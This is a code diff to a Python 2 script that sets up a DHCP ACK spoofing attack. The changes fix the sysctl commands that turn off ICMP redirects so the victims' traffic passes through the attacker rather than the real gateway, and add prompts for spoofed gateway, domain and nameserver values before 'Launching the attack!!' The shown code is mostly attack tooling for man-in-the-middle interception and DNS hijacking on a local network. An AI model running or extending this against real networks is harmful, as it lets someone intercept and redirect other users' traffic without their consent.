@@ -23,21 +23,26 @@ if int(out.split(' ')[2]) != 1:
         p1.communicate()
 
 
+print('\n\n')
+
 interface = raw_input('Network interface to listen/spoof :').strip()
 
-p = Popen(['sysctl', 'net.ipv4.conf.' + interface + 'send_redirects'], stdout=PIPE, stderr=PIPE)
-(out,err) = p.communicate()
-if int(out.split(' ')[2]) != 1:
-    print('By default, this interface will send ICMP redirect to the real gateway.')
-	print('That means you won't be able to intercept packets!')
-	print('If you are only targetting the DNS hack, however, this should not cause problem.')
+
+p2 = Popen(['sysctl', 'net.ipv4.conf.' + interface + '.send_redirects'], stdout=PIPE, stderr=PIPE)
+(out,err) = p2.communicate()
+if int(out.split(' ')[2]) != 0:
+    print('By default, this interface will send ICMP_REDIRECT to redirect victim to the real gateway.')
+    print('That means you won\'t be able to intercept packets!')
+    print('If you are only targetting the DNS hack, however, this should not cause problem.')
 
     activate_forwarding = raw_input('Deactivate ICMP redirect? (y/n) :')
     if activate_forwarding == 'y':
-        p1 = Popen(['sysctl', 'net.ipv4.conf.'+interface+'send_redirects=1'], stdout=PIPE, stderr=PIPE)
-        p1.communicate()
+        p3 = Popen(['sysctl', 'net.ipv4.conf.'+interface+'.send_redirects=0'], stdout=PIPE, stderr=PIPE)
+        p3.communicate()
 
 attack = DHCPAckSpoofing(interface=interface)
+
+print('\n\n')
 
 do_scan = raw_input('Do you want to scan for DHCP servers \n'
                 'before listening for incoming requests? (y/n) :')
@@ -48,6 +53,8 @@ if do_scan == 'y':
     attack.scan_dhcp_servers(timeout=timeout)
     attack.print_found_dhcp()
 
+print('\n\n')
+
 print('\nSetup attack parameters ... ')
 domain = DomainConfig(
     gateway=raw_input('gateway :'),
@@ -56,6 +63,8 @@ domain = DomainConfig(
     domain_name=raw_input('domain name :'),
     nameserver=raw_input('nameserver :')
     )
+
+print('\n\n')
 
 print('\nLaunching the attack!!')
 print('Waiting for clients to send DHCP request...')
